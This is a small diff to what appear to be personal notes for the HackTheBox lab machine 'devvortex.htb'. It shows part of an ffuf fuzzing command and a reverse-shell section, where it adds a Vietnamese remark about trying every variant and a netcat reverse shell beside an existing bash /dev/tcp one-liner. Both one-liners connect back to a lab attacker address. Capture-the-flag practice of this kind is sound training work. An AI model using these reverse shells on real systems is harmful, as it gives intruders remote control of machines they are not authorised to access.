@@ -39,8 +39,11 @@ ffuf -c -ic -w /usr/share/wordlists/dirb/big.txt -u http://devvortex.htb  -H "HO
 
 # reverse shell
 
+thử hết các dạng :)))
+
 ```
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.74/1337 0>&1'
+nc -c sh 10.10.14.74 1337
 ```
 
 ```
